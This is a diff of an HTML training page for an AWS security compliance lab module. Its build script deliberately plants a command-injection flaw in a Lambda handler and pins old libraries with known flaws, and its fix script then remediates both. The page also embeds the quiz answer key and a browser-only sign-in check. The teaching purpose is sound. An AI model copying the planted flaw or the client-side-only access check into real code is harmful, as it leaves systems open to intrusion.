+RUN pip install --no-cache-dir -r requirements.txt
+CMD ["python", "-c", "print('sf-secure-store api')"]
+EOF
+printf 'requests==2.19.1\nurllib3==1.23\n' &gt; app/container/requirements.txt
+
+REGISTRY="$ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com"
+aws ecr get-login-password "${A[@]}" | docker login --username AWS --password-stdin "$REGISTRY"
+docker build --platform linux/amd64 -t "$REGISTRY/$PROJECT/api:v1" app/container
+docker tag "$REGISTRY/$PROJECT/api:v1" "$REGISTRY/$PROJECT/api:latest"
+docker push "$REGISTRY/$PROJECT/api:v1"
+docker push "$REGISTRY/$PROJECT/api:latest"
+
+# 5. Lambda function with an unsafe code pattern (weak)
+cat &gt; policies/lambda-trust.json &lt;&lt;'EOF'
+{"Version": "2012-10-17",
+ "Statement": [{"Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"},
+                "Action": "sts:AssumeRole"}]}
+EOF
+aws iam create-role "${G[@]}" --role-name "$PROJECT-lambda-role" \
+  --assume-role-policy-document file://policies/lambda-trust.json
+aws iam attach-role-policy "${G[@]}" --role-name "$PROJECT-lambda-role" \
+  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+sleep 10
+
+mkdir -p app/lambda
+cat &gt; app/lambda/report.py &lt;&lt;'EOF'
+import subprocess
+
+
+def handler(event, context):
+    # Weak: the report name comes from the caller and is passed to a shell
+    name = event.get("report", "daily")
+    out = subprocess.run("cat /tmp/" + name + ".txt", shell=True,
+                         capture_output=True, text=True)
+    return {"output": out.stdout}
+EOF
+(cd app/lambda &amp;&amp; zip -q report.zip report.py)
+aws lambda create-function "${A[@]}" --function-name "$PROJECT-report" \
+  --runtime python3.12 --handler report.handler \
+  --role "arn:aws:iam::$ACCOUNT_ID:role/$PROJECT-lambda-role" \
+  --zip-file fileb://app/lambda/report.zip
+
+echo "Module 3 build complete."</code></pre></div></details><details class="file"><summary>fix/m3-fix.sh</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash">#!/usr/bin/env bash
+# Module 3 fix: turn on Inspector, patch and harden (after state)
+set -euo pipefail
+cd "$(dirname "$0")/.."
+source ./env.sh
+
+# 1. Amazon Inspector for EC2, ECR images, Lambda packages and Lambda code
+aws inspector2 enable "${A[@]}" --resource-types EC2 ECR LAMBDA LAMBDA_CODE
+
+# 2. EC2: require instance metadata version 2, then install security updates
+aws ec2 modify-instance-metadata-options "${A[@]}" --instance-id "$INSTANCE_ID" \
+  --http-tokens required --http-endpoint enabled
+aws ssm send-command "${A[@]}" --document-name AWS-RunPatchBaseline \
+  --targets "Key=InstanceIds,Values=$INSTANCE_ID" \
+  --parameters Operation=Install --comment "sf-secure-store patching" \
+  --query Command.CommandId --output text
+
+# 3. ECR: scan on push, then push an image with an updated base and libraries
+aws ecr put-image-scanning-configuration "${A[@]}" --repository-name "$PROJECT/api" \
+  --image-scanning-configuration scanOnPush=true
+cat &gt; app/container/Dockerfile &lt;&lt;'EOF'
+FROM python:3.12-slim
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+CMD ["python", "-c", "print('sf-secure-store api')"]
+EOF
+printf 'requests==2.32.3\nurllib3==2.2.3\n' &gt; app/container/requirements.txt
+
+REGISTRY="$ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com"
+aws ecr get-login-password "${A[@]}" | docker login --username AWS --password-stdin "$REGISTRY"
+docker build --platform linux/amd64 -t "$REGISTRY/$PROJECT/api:v2" app/container
+docker tag "$REGISTRY/$PROJECT/api:v2" "$REGISTRY/$PROJECT/api:latest"
+docker push "$REGISTRY/$PROJECT/api:v2"
+docker push "$REGISTRY/$PROJECT/api:latest"
+
+# 4. Lambda: accept only known report names and do not use a shell
+cat &gt; app/lambda/report.py &lt;&lt;'EOF'
+import subprocess
+
+ALLOWED_REPORTS = {"daily", "weekly"}
+
+
+def handler(event, context):
+    # Fixed: only known report names are accepted, and no shell is used
+    name = event.get("report", "daily")
+    if name not in ALLOWED_REPORTS:
+        return {"error": "unknown report"}
+    out = subprocess.run(["cat", f"/tmp/{name}.txt"],
+                         capture_output=True, text=True)
+    return {"output": out.stdout}
+EOF
+(cd app/lambda &amp;&amp; rm -f report.zip &amp;&amp; zip -q report.zip report.py)
+aws lambda update-function-code "${A[@]}" --function-name "$PROJECT-report" \
+  --zip-file fileb://app/lambda/report.zip
+
+echo "Module 3 fix complete. Wait 20 to 30 minutes for Amazon Inspector to finish scanning."</code></pre></div></details><details class="file"><summary>app/container/Dockerfile (after)</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-text">FROM python:3.12-slim
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+CMD ["python", "-c", "print('sf-secure-store api')"]</code></pre></div></details><details class="file"><summary>app/container/requirements.txt (after)</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-text">requests==2.32.3
+urllib3==2.2.3</code></pre></div></details><details class="file"><summary>app/lambda/report.py (after)</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-python">import subprocess
+
+ALLOWED_REPORTS = {"daily", "weekly"}
+
+
+def handler(event, context):
+    # Fixed: only known report names are accepted, and no shell is used
+    name = event.get("report", "daily")
+    if name not in ALLOWED_REPORTS:
+        return {"error": "unknown report"}
+    out = subprocess.run(["cat", f"/tmp/{name}.txt"],
+                         capture_output=True, text=True)
+    return {"output": out.stdout}</code></pre></div></details><details class="file"><summary>cleanup.sh (Module 3 block)</summary><div class="code"><button class="copy" type="button">Copy</button><pre><code class="lang-bash"># --- Module 3: Vulnerability Management and Application Security Testing ---
+aws inspector2 disable "${A[@]}" --resource-types EC2 ECR LAMBDA LAMBDA_CODE
+aws lambda delete-function "${A[@]}" --function-name "$PROJECT-report"
+aws iam detach-role-policy "${G[@]}" --role-name "$PROJECT-lambda-role" \
+  --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+aws iam delete-role "${G[@]}" --role-name "$PROJECT-lambda-role"
+aws ecr delete-repository "${A[@]}" --repository-name "$PROJECT/api" --force
+aws ec2 terminate-instances "${A[@]}" --instance-ids "$INSTANCE_ID"
+aws ec2 wait instance-terminated "${A[@]}" --instance-ids "$INSTANCE_ID"
+aws ec2 delete-security-group "${A[@]}" --group-id "$SG_ID"
+aws iam remove-role-from-instance-profile "${G[@]}" \
+  --instance-profile-name "$PROJECT-ec2-profile" --role-name "$PROJECT-ec2-role"
+aws iam delete-instance-profile "${G[@]}" --instance-profile-name "$PROJECT-ec2-profile"
+aws iam detach-role-policy "${G[@]}" --role-name "$PROJECT-ec2-role" \
+  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+aws iam delete-role "${G[@]}" --role-name "$PROJECT-ec2-role"</code></pre></div></details></section>
+  <section class="sec assess" id="assessment">
+    <h2>Module assessment</h2>
+    <p>10 questions. Pass mark: 70%. You can take the assessment as many times as you need. After each attempt you will see the correct answer and a short explanation for every question.</p>
+    <div id="quiz"></div>
+    <div id="quiz-result"></div>
+    <button class="btn" id="quiz-submit" type="button">Submit answers</button>
+    <button class="btn ghost" id="quiz-retake" type="button" style="display:none">Retake the assessment</button>
+    <div class="attempts" id="attempts"></div>
+  </section>
+  <section class="sec">
+    <h2>Complete this module</h2>
+    <div class="complete-box">
+      <button class="btn" id="mark-complete" type="button" disabled>Mark module as complete</button>
+      <span class="status" id="complete-status"></span>
+    </div>
+  </section>
+  <div class="navrow"><a class="btn ghost" href="prowler-lab-m2.html?v=2026100701">&larr; Module 2</a><a class="btn" href="prowler-lab-m4.html?v=2026100701">Module 4: Credentials Protection and Permissions Analysis &rarr;</a></div>
+  <div class="foot">Prowler Security Compliance Labs · Module 3 · Build 2026100701</div>
+</div>
+
+
+<script>
+/* SF auth gate — Google SSO (popup, admins only) + email/password (learners).
+   Same logic as the existing SF Knowledge Hub course pages. */
+(function () {
+const firebaseConfig = {
+  apiKey: "AIzaSyC-I-IOCq2fCwa471fsD5xOn6SYQSBDp7Q",
+  authDomain: "sfcertification-grafana.firebaseapp.com",
+  projectId: "sfcertification-grafana",
+  storageBucket: "sfcertification-grafana.firebasestorage.app",
+  messagingSenderId: "227322696511",
+  appId: "1:227322696511:web:12e7ced7dd3d45fa06798a"
+};
+  const ALLOWED_DOMAIN = "sourcefuse.com";
+  const ALLOWED_EXTRA = ["ravjv2013@gmail.com"];  // TEST ONLY — remove after testing
+  // Google SSO is restricted to these admin addresses ONLY. Everyone else signs in
+  // with email/password (that path is unchanged and still uses validDomain()).
+  const ADMIN_SSO = ["jv.ravichandran@sourcefuse.com","noushin.khan@sourcefuse.com"];
+  let auth, GoogleProvider, signInRedirect, signInPopup, getRedirect, signInEmail, onAuth, signOutFn, appMod;
+  let readyCb = null, done = false;
+
+  async function initFirebase() {
+    appMod = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
+    const authMod = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js");
+    const app = appMod.getApps().length ? appMod.getApp() : appMod.initializeApp(firebaseConfig);
+    auth = authMod.getAuth(app);
+    GoogleProvider = authMod.GoogleAuthProvider;
+    signInRedirect = (p) => authMod.signInWithRedirect(auth, p);
+    signInPopup = (p) => authMod.signInWithPopup(auth, p);
+    getRedirect = () => authMod.getRedirectResult(auth);
+    signInEmail = (e, pw) => authMod.signInWithEmailAndPassword(auth, e, pw);
+    onAuth = (cb) => authMod.onAuthStateChanged(auth, cb);
+    signOutFn = () => authMod.signOut(auth);
+  }
+  function styleTag(){return `<style>
+    .sf-auth-backdrop{position:fixed;inset:0;background:rgba(16,38,60,.55);backdrop-filter:blur(3px);display:flex;align-items:center;justify-content:center;z-index:9999;padding:20px}
+    .sf-auth-card{background:#fff;border-radius:16px;padding:30px 28px;width:100%;max-width:400px;box-shadow:0 12px 40px rgba(10,30,55,.25)}
+    .sf-auth-badge{display:inline-block;background:var(--blue,#1a6eb5);color:#fff;font-weight:700;font-size:12px;padding:4px 11px;border-radius:14px;margin-bottom:14px}
+    .sf-auth-card h2{margin:0 0 6px;font-size:20px;color:#1a2733}
+    .sf-auth-sub{margin:0 0 20px;color:#5a6b7a;font-size:14px}
+    .sf-google{width:100%;display:flex;align-items:center;justify-content:center;gap:10px;background:var(--blue,#1a6eb5);border:0;border-radius:10px;padding:12px;font-size:15px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit}
+    .sf-google:hover{background:var(--blue-d,#12507f)}
+    .sf-g{background:#fff;color:#1a6eb5;font-weight:800;width:22px;height:22px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:13px}
+    .sf-or{display:flex;align-items:center;text-align:center;color:#93a1af;font-size:12px;margin:18px 0}
+    .sf-or::before,.sf-or::after{content:"";flex:1;height:1px;background:#e2e8ef}
+    .sf-or span{padding:0 12px}
+    .sf-lbl{display:block;font-size:12.5px;font-weight:600;color:#5a6b7a;margin-bottom:5px}
+    .sf-inp{width:100%;border:1.5px solid #dbe3ec;border-radius:9px;padding:11px 12px;font-size:14.5px;margin-bottom:14px;font-family:inherit}
+    .sf-inp:focus{outline:none;border-color:var(--blue,#1a6eb5)}
+    .sf-signin{width:100%;background:var(--blue,#1a6eb5);color:#fff;border:0;border-radius:10px;padding:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}
+    .sf-signin:hover{background:var(--blue-d,#12507f)}
+    .sf-err{color:#b5341a;font-size:13px;margin-top:12px;min-height:16px}
+  </style>`;}
+  function overlayHTML(){return `
+    <div class="sf-auth-backdrop" id="sf-auth"><div class="sf-auth-card">
+      <div class="sf-auth-badge">SF Knowledge Hub</div>
+      <h2>Prowler Security Compliance Labs</h2>
+      <p class="sf-auth-sub">Sign in with your SourceFuse Google account to access the course and save your progress.</p>
+      <button class="sf-google" id="sf-google"><span class="sf-g">G</span> Sign in with Google</button>
+      <div class="sf-or"><span>OR</span></div>
+      <label class="sf-lbl">Email</label>
+      <input class="sf-inp" id="sf-email" type="email" placeholder="you@sourcefuse.com" autocomplete="username">
+      <label class="sf-lbl">Password</label>
+      <input class="sf-inp" id="sf-pass" type="password" placeholder="••••••••" autocomplete="current-password">
+      <button class="sf-signin" id="sf-signin">Sign in with email</button>
+      <div class="sf-err" id="sf-err"></div>
+    </div></div>`;}
+  function fail(m){const e=document.getElementById("sf-err");if(e)e.textContent=m;}
+  function validDomain(x){if(typeof x!=="string")return false;var e=x.toLowerCase();return e.endsWith("@"+ALLOWED_DOMAIN)||ALLOWED_EXTRA.includes(e);}
+  function validGoogle(x){if(typeof x!=="string")return false;return ADMIN_SSO.includes(x.toLowerCase());}
+  function isGoogleUser(u){try{return !!(u&&u.providerData&&u.providerData.some(function(p){return p&&p.providerId==="google.com";}));}catch(_){return false;}}
+  function proceed(email){if(done)return;done=true;const el=document.getElementById("sf-auth");if(el)el.remove();if(readyCb)readyCb(email,signOutFn);}
+  function wireOverlay(){
+    document.getElementById("sf-google").addEventListener("click",async()=>{
+      fail("");
+      if(!signInRedirect)return fail("Auth service not ready — Google SSO needs the deployed https host. Use email/password below.");
+      const p=new GoogleProvider();p.setCustomParameters({hd:ALLOWED_DOMAIN,prompt:"select_account"});
+      // Popup avoids the cross-site redirect handshake that browsers now block.
+      if(signInPopup){
+        try{
+          const r=await signInPopup(p);
+          const email=(r&&r.user&&r.user.email)||"";
+          if(!validGoogle(email)){await signOutFn();return fail("Google sign-in is restricted to admin accounts. Use email/password below.");}
+          return proceed(email);
+        }catch(e){
+          console.log("[auth] signInWithPopup failed; code:",e&&e.code,"| message:",e&&e.message);
+          const blocked=e&&(e.code==="auth/popup-blocked"||e.code==="auth/operation-not-supported-in-this-environment");
+          if(!blocked)return fail("Google sign-in couldn't complete. Use email/password below.");
+        }
+      }
+      try{
+        try{sessionStorage.setItem("sf-google-pending","1");}catch(_){}
+        await signInRedirect(p);}
+      catch(e){console.log("[auth] signInWithRedirect failed; code:",e&&e.code,"| message:",e&&e.message);fail("Google sign-in couldn't start. Use email/password below.");}
+    });
+    document.getElementById("sf-signin").addEventListener("click",async()=>{
+      fail("");
+      const email=(document.getElementById("sf-email").value||"").trim();
+      const pass=document.getElementById("sf-pass").value||"";
+      if(!validDomain(email))return fail("Email must be an @sourcefuse.com address.");
+      if(!pass)return fail("Enter your password.");
+      try{const r=await signInEmail(email,pass);proceed((r.user&&r.user.email)||email);}
+      catch(e){console.log("[auth] signInEmail failed; code:",e&&e.code,"| message:",e&&e.message);fail("Incorrect email or password.");}
+    });
+  }
+  async function mount(onReady){
+    readyCb=onReady;
+    document.head.insertAdjacentHTML("beforeend",styleTag());
+    document.body.insertAdjacentHTML("beforeend",overlayHTML());
+    try{await initFirebase();}catch(e){fail("Auth service loading… (Google SSO needs the deployed https host).");}
+    if(getRedirect){
+      try{const res=await getRedirect();
+        if(res&&res.user){const email=res.user.email;
+          if(!validGoogle(email)){await signOutFn();fail("Google sign-in is restricted to admin accounts. Use email/password below.");}
+          else{proceed(email);return;}}
+        else if(sessionStorage.getItem("sf-google-pending")==="1"){
+          sessionStorage.removeItem("sf-google-pending");
+          fail("Google sign-in didn't complete (browser blocked the sign-in handshake). Use email/password below.");
+        }
+      }catch(e){
+        console.log("[auth] getRedirectResult error; code:",e&&e.code,"| message:",e&&e.message);
+        fail("Google sign-in didn't complete. Try again or use email/password.");
+      }
+    }
+    if(onAuth){onAuth(async(u)=>{
+      if(!u)return;
+      if(isGoogleUser(u)){
+        if(validGoogle(u.email))proceed(u.email);
+        else{await signOutFn();fail("Google sign-in is restricted to admin accounts. Use email/password below.");}
+        return;
+      }
+      if(validDomain(u.email))proceed(u.email);
+    });}
+    wireOverlay();
+  }
+  window.SFAuth={mount};
+})();
+</script>
+
+
+<script>
+/* Course progress for the signed-in learner. */
+window.PLStore=(function(){
+  var PREFIX="prowlerlab_v1__";
+  function key(email){return PREFIX+String(email||"").replace(/[^a-z0-9]/gi,"_").toLowerCase();}
+  function load(email){try{var s=JSON.parse(localStorage.getItem(key(email)));if(s&&s.modules)return s;}catch(e){}return {modules:{}};}
+  function save(email,s){try{localStorage.setItem(key(email),JSON.stringify(s));}catch(e){}}
+  function mod(s,k){if(!s.modules[k])s.modules[k]={attempts:[],passed:false,bestPct:0,complete:false};return s.modules[k];}
+  return {
+    load:load,
+    get:function(email,k){return mod(load(email),k);},
+    addAttempt:function(email,k,score,total,passMark){
+      var s=load(email),m=mod(s,k),pct=Math.round(score/total*100);
+      m.attempts.push({attempt:m.attempts.length+1,score:score,total:total,pct:pct,passed:pct>=passMark,ts:Date.now()});
+      if(pct>m.bestPct)m.bestPct=pct;
+      if(pct>=passMark&&!m.passed){m.passed=true;m.passedAt=Date.now();m.passedPct=pct;}
+      save(email,s);return m;
+    },
+    complete:function(email,k){var s=load(email),m=mod(s,k);if(!m.passed)return m;m.complete=true;m.completedAt=Date.now();save(email,s);return m;}
+  };
+})();
+</script>
+
+<script>window.PL_MODULE={"key": "prowler-lab-m3", "pass": 70, "questions": [{"q": "Which service actually scans the server, images and Lambda code for vulnerabilities in this module?", "o": ["Amazon GuardDuty", "Prowler", "Amazon Inspector", "AWS Config"], "a": 2, "e": "Amazon Inspector does the scanning. Prowler checks that Inspector is turned on and whether its findings are open."}, {"q": "Why is allowing instance metadata version 1 (HttpTokens=optional) a weakness?", "o": ["It turns off patching", "It makes the instance slower", "An attacker who can make the server send a web request may read the instance role's credentials", "It removes the instance's public IP"], "a": 2, "e": "Version 2 requires a session token, which blocks many request forgery attacks that could read role credentials through version 1."}, {"q": "What was wrong with the original Lambda code?", "o": ["It had no handler", "It used Python 3.12", "It used too much memory", "It joined caller input into a shell command, allowing command injection"], "a": 3, "e": "Passing caller text to a shell lets an attacker add their own commands. The fix accepts only known values and does not use a shell."}, {"q": "Which fix made <code>ecr_repositories_scan_images_on_push_enabled<\/code> pass?", "o": ["Turning on GuardDuty", "Changing the base image", "Pushing a v2 image", "Setting scanOnPush=true on the repository"], "a": 3, "e": "The check looks at the repository's scan-on-push setting, which the fix turned on."}, {"q": "After the fix, <code>inspector2_active_findings_exist<\/code> still fails. What is the most likely reason?", "o": ["Prowler cannot read Inspector", "The Lambda code is still weak", "Inspector is still off", "The old v1 image with known vulnerabilities is still stored, or the operating system has open findings"], "a": 3, "e": "The check reports any open finding. The old image stays in the repository until you delete it, so its findings stay open."}, {"q": "Which PCI-DSS v4.0 requirement do these checks mainly support?", "o": ["Requirement 4: encrypt data in transit", "Requirement 12: security policy", "Requirement 9: physical access", "Requirement 6.3 and 11.3: identify vulnerabilities and run vulnerability scans"], "a": 3, "e": "PCI-DSS 6.3 covers identifying and fixing vulnerabilities, and 11.3 covers regular vulnerability scans."}, {"q": "What does Amazon Inspector NOT find?", "o": ["Known CVEs in operating system packages", "Known CVEs in container image libraries", "New, unknown weaknesses that have not been published", "Known CVEs in Lambda packages"], "a": 2, "e": "Inspector compares software versions against published vulnerabilities. It cannot find weaknesses nobody has published yet."}, {"q": "PCI-DSS also requires penetration testing. What does Prowler check about it?", "o": ["Nothing; penetration testing is outside what Prowler checks", "That WAF is attached", "That a penetration test was done last year", "That Inspector ran a penetration test"], "a": 0, "e": "Prowler and Inspector do not run penetration tests or test a running application. Those need separate testing."}, {"q": "Why did the build script use an old base image and old library versions?", "o": ["To make the image smaller", "To avoid Docker errors", "To create known vulnerabilities for Inspector to find", "Because new versions do not run on Lambda"], "a": 2, "e": "Old library versions have published CVEs, which gives Inspector real findings to report in the lab."}, {"q": "Where in a Prowler finding do you see which ISO 27001 control a check supports?", "o": ["Compliance", "Severity", "Resource", "Status extended"], "a": 0, "e": "The Compliance field lists the framework requirements, for example ISO 27001 control 8.8 for vulnerability management."}]};</script>
+<script>
+(function(){
+  var CFG=window.PL_MODULE;
+  function $(s,r){return (r||document).querySelector(s);}
+  function $$(s,r){return Array.prototype.slice.call((r||document).querySelectorAll(s));}
+
+  // Copy buttons on code blocks
+  $$(".code .copy").forEach(function(b){
+    b.addEventListener("click",function(){
+      var t=b.parentNode.querySelector("code").innerText;
+      var done=function(){b.textContent="Copied";setTimeout(function(){b.textContent="Copy";},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done,function(){});}
+      else{var ta=document.createElement("textarea");ta.value=t;document.body.appendChild(ta);ta.select();try{document.execCommand("copy");done();}catch(e){}document.body.removeChild(ta);}
+    });
+  });
+
+  function renderQuiz(){
+    var box=$("#quiz");var html="";
+    CFG.questions.forEach(function(q,i){
+      html+='<div class="q" data-i="'+i+'"><div class="q-t">'+(i+1)+'. '+q.q+'</div>';
+      q.o.forEach(function(o,j){
+        html+='<label class="opt"><input type="radio" name="q'+i+'" value="'+j+'"><span>'+o+'</span></label>';
+      });
+      html+='<div class="expl"></div></div>';
+    });
+    box.innerHTML=html;
+    $("#quiz-result").innerHTML="";
+    $("#quiz-submit").style.display="";
+    $("#quiz-retake").style.display="none";
+  }
+
+  function grade(email){
+    var answers=[],missing=0;
+    CFG.questions.forEach(function(q,i){
+      var c=$('input[name="q'+i+'"]:checked');
+      if(!c)missing++;answers.push(c?parseInt(c.value,10):-1);
+    });
+    if(missing){$("#quiz-result").innerHTML='<div class="result fail">Answer all questions before you submit. '+missing+' question'+(missing>1?'s are':' is')+' not answered yet.</div>';return;}
+    var score=0;
+    CFG.questions.forEach(function(q,i){
+      var qe=$('.q[data-i="'+i+'"]');qe.classList.add("done");
+      $$("input",qe).forEach(function(inp){inp.disabled=true;});
+      var labels=$$("label.opt",qe);
+      labels[q.a].classList.add("right");
+      var ok=answers[i]===q.a;if(ok)score++;else labels[answers[i]].classList.add("wrong");
+      $(".expl",qe).innerHTML=(ok?'<b class="r">Correct.</b> ':'<b class="w">Not correct.</b> The correct answer is: <b>'+q.o[q.a]+'</b>. ')+q.e;
+    });
+    var total=CFG.questions.length;
+    var m=window.PLStore.addAttempt(email,CFG.key,score,total,CFG.pass);
+    var pct=Math.round(score/total*100);
+    var passed=pct>=CFG.pass;
+    $("#quiz-result").innerHTML='<div class="result '+(passed?'pass':'fail')+'">'+
+      (passed?'You passed: ':'Not passed yet: ')+score+' of '+total+' correct ('+pct+'%). Pass mark: '+CFG.pass+'%.'+
+      '<small>'+(passed?'You can now mark this module as complete.':'Read the explanations under each question, review the module, and try again. You can retake the assessment as many times as you need.')+'</small></div>';
+    $("#quiz-submit").style.display="none";
+    $("#quiz-retake").style.display="";
+    refresh(email);
+    $("#quiz-result").scrollIntoView({behavior:"smooth",block:"center"});
+  }
+
+  function refresh(email){
+    var m=window.PLStore.get(email,CFG.key);
+    var att=m.attempts.length;
+    $("#attempts").textContent=att?('Attempts: '+att+' · Best score: '+m.bestPct+'%'+(m.passed?' · Passed':'')):'No attempts yet.';
+    var btn=$("#mark-complete"),st=$("#complete-status");
+    if(m.complete){btn.disabled=true;btn.textContent="Module completed";st.textContent="Completed on "+new Date(m.completedAt).toLocaleDateString();st.className="status done";}
+    else if(m.passed){btn.disabled=false;btn.textContent="Mark module as complete";st.textContent="Assessment passed. You can now mark this module as complete.";st.className="status";}
+    else{btn.disabled=true;btn.textContent="Mark module as complete";st.textContent="Locked until you pass the module assessment ("+CFG.pass+"% or more).";st.className="status";}
+  }
+
+  window.SFAuth.mount(function(email,signOut){
+    $("#user").innerHTML=email+' <button class="signout" id="signout">Sign out</button>';
+    var so=$("#signout");if(so&&signOut)so.onclick=function(){signOut().then(function(){location.reload();});};
+    $("#app").style.display="block";
+    renderQuiz();
+    $("#quiz-submit").onclick=function(){grade(email);};
+    $("#quiz-retake").onclick=function(){renderQuiz();$("#assessment").scrollIntoView({behavior:"smooth"});};
+    $("#mark-complete").onclick=function(){window.PLStore.complete(email,CFG.key);refresh(email);};
+    refresh(email);
+  });
+})();
+</script>
+
+</body></html>
